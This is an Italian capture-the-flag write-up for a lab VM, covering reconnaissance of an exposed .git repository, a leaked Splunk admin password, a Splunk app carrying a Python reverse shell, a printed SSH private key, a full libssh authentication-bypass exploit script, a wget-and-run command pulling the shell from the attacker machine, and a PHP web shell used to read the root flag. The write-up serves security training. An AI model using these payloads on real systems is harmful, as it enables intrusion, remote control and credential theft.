# Writeup CTF 27 Maggio 2019
[Setup della macchina](../README.md#aperitech---27-maggio-2019)

Dopo aver avviato *vm* si procede all'identificazione dell'IP della stessa (supponiamo che la rete host Virtualbox sia 192.168.56.0/24)

NOTA: dagli output dei comandi eliminiamo le righe non significative
```
$ sudo nmap -sS -F 192.168.56.0/24 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-29 01:31 CEST
[...]
Nmap scan report for 192.168.56.102
Host is up (0.00046s latency).
Not shown: 97 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
MAC Address: 08:00:27:B8:11:FD (Oracle VirtualBox virtual NIC)
[...]
```
La scansione ```nmap``` ci ritorna l'IP **192.168.56.102** su cui sono aperte le seguenti porte TCP
* 22 (ssh)
* 80 (http)
* 8000 (http-alt)

Si procede ad una analisi più approfondita del servizio http su porta 80 usando l'opzione ```-A``` di ```nmap``` (```-A: Enable OS detection, version detection, script scanning, and traceroute```)
```
$ sudo nmap -sS -n -v -p80 -A 192.168.56.102
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-29 01:36 CEST
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
[...]
Nmap scan report for 192.168.56.102
Host is up (0.00045s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.15.9 (Ubuntu)
| http-git: 
|   192.168.56.102:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: ???? 
|     Remotes:
|_      https://github.com/dennybritz/docker-splunk.git
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.15.9 (Ubuntu)
|_http-title: Welcome to nginx!
[...]
```
La scansione rileva il repository git al seguente indirizzo ```192.168.56.101:80/.git/```

Lo stesso risultato si poteva ottenere usando il tool [dirsearch](https://github.com/maurosoria/dirsearch) con le [opportune wordlist](https://raw.githubusercontent.com/danielmiessler/SecLists/7ccb85c376c0eeb7fc6d9173641f079d6c5ee31e/Discovery/Web-Content/quickhits.txt)
```
$ cd ~; mkdir ctf; cd ctf
$ git clone https://github.com/maurosoria/dirsearch.git
Cloning into 'dirsearch'...
[...]
$ cd dirsearch/
$ wget -O quickhits.txt https://raw.githubusercontent.com/danielmiessler/SecLists/7ccb85c376c0eeb7fc6d9173641f079d6c5ee31e/Discovery/Web-Content/quickhits.txt
$ ./dirsearch.py -w ./quickhits.txt -u http://192.168.56.102 -e html
[...]
Target: http://192.168.56.102

[01:47:37] Starting: 
[01:47:37] 403 -  564B  - /.git/
[01:47:37] 301 -  178B  - /.git  ->  http://192.168.56.102/.git/
[01:47:37] 200 -   23B  - /.git/HEAD
[01:47:37] 301 -  178B  - /.git/logs/refs  ->  http://192.168.56.102/.git/logs/refs/
[01:47:37] 200 -  272B  - /.git/config
[01:47:37] 403 -  564B  - /.git/logs/
[01:47:37] 200 -    2KB - /.git/index
[01:47:37] 200 -  894B  - /.git/logs/HEAD
[...]
[01:47:40] 200 -    1KB - /README.md

Task Completed
```
Anche in questo caso con ```dirsearch```rileviamo la cartella ```/.git/``` oltre che altre dir/file (return code http 200).

A questo punto cerchiamo di scaricare il contenuto del repo git che abbiamo trovato e per fare questo utilizziamo lo script ```gitdumper.sh``` disponibile sul [repo GitTools](https://github.com/internetwache/GitTools)
```
$ cd ~/ctf/
$ wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh
[...]
$ chmod a+x gitdumper.sh
$ ./gitdumper.sh 192.168.56.102/.git/ gitrepo
[...]
[*] Destination folder does not exist
[+] Creating gitrepo/.git/
[+] Downloaded: HEAD
[...]
[+] Downloaded: objects/0c/c3eadf0da8e7750a0cf9aa1004c726abad81ca
```
Si va a verificare nella cartella ```gitrepo``` quanto scaricato
```
$ tree gitrepo/.git/
gitrepo/.git/
├── COMMIT_EDITMSG
├── config
├── description
├── HEAD
├── index
├── info
│   └── exclude
├── logs
│   ├── HEAD
│   └── refs
│       ├── heads
│       │   └── master
│       └── remotes
│           └── origin
│               └── HEAD
├── objects
│   ├── 00
│   ├── 0b
│   ├── 0c
│   │   └── c3eadf0da8e7750a0cf9aa1004c726abad81ca
[...]
└── refs
    ├── heads
    │   └── master
    └── remotes
        └── origin
            └── HEAD

88 directories, 27 files
```
E ad analizzare il repository git alla ricerca di informazioni
```
$ cd ~/ctf/gitrepo/
$ git log
[...]
commit a83b9c792905e936bb1b7fe46713f6dea194e3b8 (HEAD -> master)
Author: Merlos <info@cybersaiyan.it>
Date:   Sat May 25 08:41:18 2019 +0000

    ????

commit 381ae27771e1f73874411728bc31f35723354207
Author: Merlos <info@cybersaiyan.it>
Date:   Sat May 25 08:40:26 2019 +0000

    Updated docker-compose with latest image version

commit adac166fce91656bd3321f1f99aaa604cc87cc6f
Author: Merlos <info@cybersaiyan.it>
Date:   Sat May 25 08:39:23 2019 +0000

    Updated docker-compose with new password
[...]
```
Salta immediatamente agli occhi il commit ```adac166fce91656bd3321f1f99aaa604cc87cc6f```che ha come descrizione *Updated docker-compose with new password*. Ne analizziamo il codice
```
$ git show adac166fce91656bd3321f1f99aaa604cc87cc6f
[...]
commit adac166fce91656bd3321f1f99aaa604cc87cc6f
Author: Merlos <info@cybersaiyan.it>
Date:   Sat May 25 08:39:23 2019 +0000

    Updated docker-compose with new password

diff --git a/enterprise/docker-compose.yml b/enterprise/docker-compose.yml
index dd65c9a..f77600b 100644
--- a/enterprise/docker-compose.yml
+++ b/enterprise/docker-compose.yml
@@ -15,7 +15,7 @@ services:
     image: splunk/splunk:7.0.3
     environment:
       SPLUNK_START_ARGS: --accept-license
-      SPLUNK_PASSWORD: Splunk2018
+      SPLUNK_PASSWORD: _Splunk2@!9_
     ports:
       - "8000:8000"
       - "9997:9997"
```
Questo commit ci fornisce informazioni importanti
* probabilmente abbiamo un docker sulla macchina remota (```docker-compose.yml```)
* il docker è stato configurato per istanziare una [immagine splunk](https://splunk.github.io/docker-splunk/) (```image: splunk/splunk:7.0.3```)
* la [password di splunk](https://hub.docker.com/r/splunk/splunk/) in fase di deploy è stata impostata a ```_Splunk2@!9_```

La scansione ```nmap``` aveva rilevato la porta tcp/8000 con servizio http esposto, che non avevamo analizzato. La porta tcp/8000 è [usata da Splunk](https://www.speedguide.net/port.php?port=8000) per l'accesso all'interfaccia web di ricerca.

Andiamo quindi a testare immediatamente un login all'indirizzo ```http://192.168.56.102:8000``` con credenziali ```admin/_Splunk2@!9_``` (admin è utenza amminsitrativa di default di Splunk) e verifichiamo che abbiamo accesso all'interfaccia web.
![Splunk admin login](splunk-01.png)

L'idea è di usare Splunk per ottenere una reverse shell sulla macchina e per fare questo andiamo a caricare (siamo admin) una custom app con una reverse shell python. [In questo post](https://threat.tevora.com/penetration-testing-with-splunk-leveraging-splunk-admin-credentials-to-own-the-enterprise/) trovate tutte le info (ed altro ancora).

Andiamo a ricreare la struttura standard di un'app splunk (```rev_app```) con le cartelle ed i file necessari dove
* la reverse shell (file ```bin/reverse.py```) punterà all'IP del nostro PC (192.168.56.1, defaut IP per la macchina host sulla host network di Virtualbox) sulla porta 1234
* lo script sarà eseguito da splunk periodicamente (```interval=10```)

```
$ tree rev_app/
rev_app
├── bin
│   └── reverse.py
└── default
    └── inputs.conf

$ cat rev_app/bin/reverse.py 
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
$ cat rev_app/default/inputs.conf 
[script://./bin/reverse.py]
disabled = 0
interval = 10
sourcetype = rev
$ tar czvf rev_app.tar.gz rev_app/
```
Il file dovrà essere caricato su Splunk in formato ```tar.gz```
```
$ tar czvf rev_app.tar.gz rev_app/
```
Avviamo ```netcat``` in listening sul PC
```
$ nc -lvnp 1234
Listening on [0.0.0.0] (family 2, port 1234)
```
Ed installiamo l'app dall'interfaccia web di Splunk
![Splunk admin login](splunk-02.png)

Dopo qualche secondo avremo la nostra shell come utente ```splunk```
```
$ nc -lvnp 1234
Listening on [0.0.0.0] (family 2, port 1234)
Connection from 192.168.56.102 42166 received!
/bin/sh: 0: can't access tty; job control turned off
$ $ $ $ id
uid=999(splunk) gid=999(splunk) groups=999(splunk)
```
Nella ```/home``` notiamo la cartella dell'utente ```merlos``` che ha la dir ```.ssh/``` accessibile ed il file ```id_rsa``` (chiave privata) con permessi read per everyone
```
[ dalla rev shell ]
$ ls -l /home/
total 12
drwxr-xr-x 1 ansible ansible 4096 May 25 09:49 ansible
drwxr-xr-x 5    1001    1001 4096 May 25 11:43 merlos
drwxr-xr-x 1 splunk  splunk  4096 May 25 09:50 splunk
$ ls -la /home/merlos/                    
total 40
drwxr-xr-x 5 1001 1001 4096 May 25 11:43 .
drwxr-xr-x 1 root root 4096 May 25 09:49 ..
lrwxrwxrwx 1 1001 1001    9 May 25 11:43 .bash_history -> /dev/null
-rw-r--r-- 1 1001 1001  220 May 22 08:45 .bash_logout
-rw-r--r-- 1 1001 1001 3771 May 22 08:45 .bashrc
drwx------ 2 1001 1001 4096 May 25 09:10 .cache
drwx------ 3 1001 1001 4096 May 25 09:10 .gnupg
-rw-r--r-- 1 1001 1001  807 May 22 08:45 .profile
drwx---r-x 2 1001 1001 4096 May 25 09:13 .ssh
-r-------- 1 1001 1001   33 May 25 09:46 user.txt
$ ls -l /home/merlos/.ssh/
total 12
-rw-rw-r-- 1 1001 1001  396 May 25 09:13 authorized_keys
-rw----r-x 1 1001 1001 1823 May 25 09:13 id_rsa
-rw-r--r-x 1 1001 1001  396 May 25 09:13 id_rsa.pub
$ cat /home/merlos/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAyeUjg0vLqin3W/JRRHQNFq3X2pqZG+8/N0bQTw8emOgs+SMOGcZh
U3sUqvJXie6SYxmWUOD2cTxHktb7apthe8tbL+A/JXv1mFpPezB6KOKD01WCq6WimKev3t
IK/ZwC/fNntrF0WtoChTIMbWNm7TVlyz021aGU0bga5O2gYSOrhfKb4Wy97mYk+gwYhwM9
AF677EtWBsSkplJGaiT8PKjlmANEalUja8nSfoUXLvsO6i1XCUNKaJk5HTY0jarZxUp06I
L+Vy1PkdpuWZUS+A9hVSg1zjwkiCTBw7HFzQAfQW2bp6yfbDzTRJ2c8rFXbTEEzgRiu9c3
YNNRk0ZefwAAA8g3fgvUN34L1AAAAAdzc2gtcnNhAAABAQDJ5SODS8uqKfdb8lFEdA0Wrd
fampkb7z83RtBPDx6Y6Cz5Iw4ZxmFTexSq8leJ7pJjGZZQ4PZxPEeS1vtqm2F7y1sv4D8l
e/WYWk97MHoo4oPTVYKrpaKYp6/e0gr9nAL982e2sXRa2gKFMgxtY2btNWXLPTbVoZTRuB
rk7aBhI6uF8pvhbL3uZiT6DBiHAz0AXrvsS1YGxKSmUkZqJPw8qOWYA0RqVSNrydJ+hRcu
+w7qLVcJQ0pomTkdNjSNqtnFSnTogv5XLU+R2m5ZlRL4D2FVKDXOPCSIJMHDscXNAB9BbZ
unrJ9sPNNEnZzysVdtMQTOBGK71zdg01GTRl5/AAAAAwEAAQAAAQEAuyEvMVrnguky5H5M
5O3L0+F92JjCoSm3pjx0h1K0QXWxeZoMT8eYHhBOr8O/b5E5DbGBqaVZxsrgbDHnBoDOcj
eiZVWsMcobcQMD+GKOV6bcGN2BKCd19Zg3Yoe8uCQKgedBkgwYlLzM6TfiXOFtXR/JIf+y
+3+wuFG0W8wEgwMvWOG0SKsb7j43G3xIU8V4AHFqjisZVJb5lCHIvaMQKYMgZ/gLJrunG1
lPOZnyEkZlJhYWqpZblzC/kBluw547QN5C3gLXImkXUZyifPCuv6InY+Bki82V0HzcgHsI
KNY1s8LGEULn9Mb0/Bww/bDy725/icVq8cWAiUgk72l5wQAAAIEApldpkKgQrUQhZLAxxn
sRMG/yelfFGfyXN0i8k8xmHNQIAdX9a/jUbzQfN4kWn1MBAPMUeMxWYW/e6atgOYLx0QVk
m7DUl3iDKV2430RR9J2QbqCrX7rGBrjtCxYXUUd78BRkTXJnrvF5c2pvUxtNsWv0OSqz5h
iK6PTg2mAcTc4AAACBAOXVqkTEW/ECqwn51BDVsZqCRkWao3AdJjr+ShseXE48Z4IE2DzP
tqSUc1XLb7beLeLzpBkJ6xHVDzdTuaYDIKY0ebMmYxrO2hC/BFS+5iPUW27+yXAuFCwRuG
WoB5KamFFGfRjt5ywRH33udcfEIV0u3eFkIiFAeWD5ZzaB251bAAAAgQDg4TLxaxXWoAf0
J1kWshqHMSa+rHYAagFXTVt+IwoynhivwiGta7nqQx+wX25V2JrFFDEfySScUQAmiHq1Dn
JV9YQ9vrqew9ToMprPsZiqoPOJqOf1JX2zn8fXjQR8nMi1XBrZbKBtFhH/Yic88xScWEeL
bI9lw1AjrzuhdX2YrQAAAA5tZXJsb3NAb3Nib3hlcwECAw==
-----END OPENSSH PRIVATE KEY-----
```
Usando la chiave privata dell'utente merlos tentiamo di loggarci sulla macchina
```
$ cat <<PRIVKEY > merlos.privkey
[ output della chiave privata di cui sopra ]
PRIVKEY
$ chmod 600 merlos.privkey
$ ssh -i merlos.privkey merlos@192.168.56.102
Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-15-generic x86_64)
[...]
merlos@27may:~$ id
uid=1001(merlos) gid=1001(merlos) groups=1001(merlos)
merlos@27may:~$ cat user.txt 
43801fd7db52347fb4cc8f6f080a0718
merlos@27may:~$
```
Login riuscito e flag user presa **43801fd7db52347fb4cc8f6f080a0718**

Verifichiamo i servizi in listening sulla macchina e notiamo un servizio sulla porta tcp/2222 in listening su 127.0.0.1 che risulta essere ```SSH-2.0-libssh_0.8.1```
```
merlos@27may:~$ netstat -tupnl 
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:37493         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
[...]
merlos@27may:~$ telnet 127.0.0.1 2222
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
SSH-2.0-libssh_0.8.1
^]
telnet> quit
Connection closed.
```
Una rapida ricerca sulle vulnerabilità della versione evidenzia una authentication bypass (CVE-2018-10993 libSSH authentication bypass) per cui sono disponibili vari exploit. Noi useremo [questo](https://github.com/vulhub/vulhub/tree/master/libssh/CVE-2018-10933)

Facciamo port forwarding via SSH per sfruttare localmente la vulnerabilità trovata sul servizio ssh remoto ```127.0.0.1:2222```
```
$ ssh -L 2222:localhost:2222 merlos@192.168.56.102 -i merlos.privkey
[...]
merlos@27may:~$
```
Installiamo le librerie necessarie (Ubuntu), creiamo il file ```exploit.py``` ed eseguiamolo localmente usando il port forwarding verso il nostro target
```
$ sudo apt-get install python-paramiko
$ cat <<EXPLOIT > exploit.py
#!/usr/bin/env python3
import sys
import paramiko
import socket
import logging

logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
bufsize = 2048


def execute(hostname, port, command):
    sock = socket.socket()
    try:
        sock.connect((hostname, int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        client = transport.open_session(timeout=10)
        client.exec_command(command)

        # stdin = client.makefile("wb", bufsize)
        stdout = client.makefile("rb", bufsize)
        stderr = client.makefile_stderr("rb", bufsize)

        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()

        return (output+error).decode()
    except paramiko.SSHException as e:
        logging.exception(e)
        logging.debug("TCPForwarding disabled on remote server can't connect. Not Vulnerable")
    except socket.error:
        logging.debug("Unable to connect.")

    return None


if __name__ == '__main__':
    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))
EXPLOIT
$ python exploit.py 127.0.0.1 2222 id
[...]
uid=0(root) gid=0(root) groups=0(root)
[...]
$
```
L'exploit funziona e abbiamo i privilegi di ```root```

Ora mettiamo una reverse shell python sulla macchina remota (la stessa ```reverse.py``` che abbiamo usato per l'app Splunk).

Rer fare questo
* istanziamo sul nostro PC un web server
* ci mettiamo in ascolto con ```netcat``` sulla porta 1234
* carichiamo la reverse shell sulla macchina remota usando l'exploit appena trovato
```
$ cd ~/ctf/rev_app/bin/
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
[...]
$ nc -lvnp 1234
[...]
$ cd ~/ctf/
$ python exploit.py 127.0.0.1 2222 'wget 192.168.56.1:8000/reverse.py && python reverse.py'
```
A questo punto abbiamo la webshell stabile come root ma ci accorgiamo di essere dentro un altro docker e che non c'è la flag
```
$ nc -lvnp 1234
Listening on [0.0.0.0] (family 2, port 1234)
[...]
# # # id
uid=0(root) gid=0(root) groups=0(root)
# ls -la /
total 96
drwxr-xr-x   1 root root 4096 May 29 04:44 .
drwxr-xr-x   1 root root 4096 May 29 04:44 ..
-rwxr-xr-x   1 root root    0 May 25 09:49 .dockerenv
[...]
# ls -la /root/
total 20
drwx------ 1 root root 4096 Oct 19  2018 .
drwxr-xr-x 1 root root 4096 May 29 04:44 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root  169 Oct 19  2018 .wget-hsts
# 
```
Verificando i filesystem montati troviamo che c'è la cartella ```/development``` montata sul filesystem dell'host e che al suo interno c'è la home del web server, con permessi di scrittura per ```root``` 
```
[ dalla rev shell ]
# mount -v
[...]
/dev/sda2 on /development type ext4 (rw,relatime)
/dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime)
/dev/sda2 on /etc/hostname type ext4 (rw,relatime)
/dev/sda2 on /etc/hosts type ext4 (rw,relatime)
[...]
# ls -ld /development/html/
drwxr-xr-x 6 root root 4096 May 25 11:37 /development/html/
# 
```
Creiamo una pagina php che esegue una ```system()``` per verificare l'utenza con cui gira il webserver
```
[ dalla rev shell ]
# cd /development/html/
# echo '<?php system($_GET[0]); ?>' > revshell.php
# cat revshell.php
<?php system($_GET[0]); ?>
```
Verifichiamo dal nostro PC con quale utente sta girando il web server
```
$ curl -vvv http://192.168.56.102/revshell.php?0=id
[...]
uid=0(root) gid=0(root) groups=0(root)
* Connection #0 to host 192.168.56.102 left intact
```
Siamo root e a questo punto prendiamo la flag
```
$ curl -vvv http://192.168.56.102/revshell.php?0=cat%20/root/root.txt
[...]
82a893ff69ea0c810af466152ea87eae
* Connection #0 to host 192.168.56.102 left intact
```
Flag di root **82a893ff69ea0c810af466152ea87eae**
